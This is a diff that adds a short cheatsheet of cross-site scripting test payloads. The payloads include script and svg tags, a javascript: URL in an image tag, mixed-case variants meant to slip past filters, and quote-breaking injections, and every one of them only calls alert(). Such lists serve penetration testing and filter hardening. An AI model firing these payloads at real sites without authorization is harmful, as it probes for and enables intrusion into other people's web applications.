@@ -1,0 +1,10 @@
+Cheatsheet xss payloads.
+```
+<svg/onload=alert()>
+<script>alert()</script>
+<ScRipT>alert();</ScRipT>
+<IMG SRC=jAVasCrIPt:alert()>
+<ScRiPt>alert(1)</sCriPt>
+‘; alert(1);
+‘)alert(1);//
+```
